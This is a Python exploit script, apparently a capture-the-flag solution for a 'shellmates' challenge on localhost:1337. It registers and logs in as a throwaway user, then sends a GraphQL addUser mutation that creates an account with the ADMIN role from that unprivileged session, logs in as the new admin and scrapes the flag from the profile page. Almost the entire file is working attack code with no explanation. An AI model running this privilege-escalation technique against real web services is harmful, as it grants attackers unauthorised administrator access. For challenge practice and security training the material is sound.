import requests as req
import re

URL = 'http://localhost:1337/'
ADMIN_NAME = '1337'
DUMMY_NAME = 'x'

# Register
data = dict(username=DUMMY_NAME,email=DUMMY_NAME,password=DUMMY_NAME)
res = req.post(URL + 'register', json=data).json()

assert res['success'] or 'already exists' in res['message']

# Login
data = dict(username=DUMMY_NAME,password=DUMMY_NAME)
res = req.post(URL + 'login', json=data)

assert res.json()['success']

## Grab cookie
cookie = dict(session=res.cookies['session'])

# add an admin user
data = dict(query='mutation {addUser(username:"'+ADMIN_NAME+'", password:"'+ADMIN_NAME+'", email:"random_email", role:ADMIN)}')
res = req.post(URL + 'graphql', json=data, cookies=cookie).json()

assert res['data']['addUser'] == True or 'already exists' in res['errors'][0]['message'] 

# Login as admin
data = dict(username=ADMIN_NAME,password=ADMIN_NAME)
res = req.post(URL + 'login', json=data)

assert res.json()['success']

cookie = dict(session=res.cookies['session'])
data = dict(username=ADMIN_NAME,password=ADMIN_NAME)
res = req.get(URL + 'profile', json=data, cookies=cookie)

print(re.search('shellmates{[a-zA-Z0-9_$-]*}',res.text)[0])

